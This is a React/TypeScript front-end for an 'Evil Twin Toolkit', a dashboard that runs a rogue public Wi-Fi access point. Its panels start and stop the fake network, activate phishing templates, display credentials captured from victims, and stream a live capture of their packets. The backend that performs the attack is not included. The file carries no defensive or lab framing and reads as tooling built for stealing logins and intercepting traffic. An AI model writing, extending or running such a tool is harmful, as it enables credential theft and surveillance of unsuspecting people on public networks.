import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import {
  DropdownMenu,
  DropdownMenuTrigger,
  DropdownMenuContent,
  DropdownMenuItem
} from '@/components/ui/dropdown-menu';

const App: React.FC = () => {
  const [ssid, setSsid] = useState('Free_Public_WiFi');
  const [templates, setTemplates] = useState<string[]>([]);
  const [selectedTemplate, setSelectedTemplate] = useState('');
  const [logs, setLogs] = useState<{ file: string; entries: string[] }[]>([]);
  const [packets, setPackets] = useState<any[]>([]);

  useEffect(() => {
    fetch('/api/templates')
      .then(res => res.json())
      .then(data => setTemplates(data));
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      fetch('/api/creds')
        .then(res => res.json())
        .then(data => setLogs(data));

      fetch('/api/packet_capture/live')
        .then(res => res.json())
        .then(data => setPackets(data));
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const startEvilTwin = () => {
    fetch('/api/start_ap', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ssid })
    });
  };

  const stopEvilTwin = () => {
    fetch('/api/stop_ap', { method: 'POST' });
  };

  const activateTemplate = () => {
    fetch('/api/activate_template', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: selectedTemplate })
    });
  };

  const startPacketCapture = () => {
    fetch('/api/packet_capture/start', { method: 'POST' });
  };

  const stopPacketCapture = () => {
    fetch('/api/packet_capture/stop', { method: 'POST' });
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono p-6">
      <h1 className="text-2xl mb-4 border-b border-green-400 pb-2">Evil Twin Toolkit</h1>

      {/* Rogue AP Config */}
      <Card className="bg-zinc-900 border border-green-400 mb-4">
        <CardContent className="space-y-2 pt-4">
          <label className="block">SSID:</label>
          <Input className="bg-black border-green-500 text-green-300" value={ssid} onChange={e => setSsid(e.target.value)} />

          <label className="block mt-4">Select Phishing Template:</label>
          <DropdownMenu>
            <DropdownMenuTrigger className="bg-black border border-green-400 p-2">
              {selectedTemplate || 'Choose Template'}
            </DropdownMenuTrigger>
            <DropdownMenuContent className="bg-zinc-800 border border-green-600">
              {templates.map((t, i) => (
                <DropdownMenuItem key={i} onSelect={() => setSelectedTemplate(t)} className="hover:bg-green-800">
                  {t}
                </DropdownMenuItem>
              ))}
            </DropdownMenuContent>
          </DropdownMenu>

          <div className="flex gap-2 mt-4">
            <Button onClick={activateTemplate} className="bg-green-700 hover:bg-green-600 text-black">Activate Template</Button>
            <Button onClick={startEvilTwin} className="bg-green-700 hover:bg-green-600 text-black">Start Rogue AP</Button>
            <Button onClick={stopEvilTwin} className="bg-red-600 hover:bg-red-500 text-black">Stop Rogue AP</Button>
          </div>
        </CardContent>
      </Card>

      {/* Credentials Panel */}
      <Card className="bg-zinc-900 border border-green-400 mb-4">
        <CardContent className="pt-4">
          <h2 className="text-xl mb-2">🗂 Captured Credentials</h2>
          {logs.length === 0 && <p className="text-green-600">No credentials logged yet...</p>}
          {logs.map((log, i) => (
            <div key={i} className="mb-4">
              <h3 className="text-green-300">{log.file}</h3>
              <ul className="pl-4 text-green-200">
                {log.entries.map((entry, j) => (
                  <li key={j}>- {entry}</li>
                ))}
              </ul>
            </div>
          ))}
        </CardContent>
      </Card>

      {/* Packet Capture Panel */}
      <Card className="bg-zinc-900 border border-green-400">
        <CardContent className="pt-4">
          <h2 className="text-xl mb-2">📡 Live Packet Capture</h2>
          <div className="flex gap-2 mb-4">
            <Button onClick={startPacketCapture} className="bg-blue-600 text-black">Start Capture</Button>
            <Button onClick={stopPacketCapture} className="bg-red-600 text-black">Stop Capture</Button>
          </div>
          <ul className="pl-4 text-green-200 text-sm max-h-64 overflow-y-scroll">
            {packets.slice().reverse().map((packet, i) => (
              <li key={i}>[{packet.time}] {packet.src} → {packet.dst} ({packet.protocol})</li>
            ))}
          </ul>
        </CardContent>
      </Card>
    </div>
  );
};

export default App;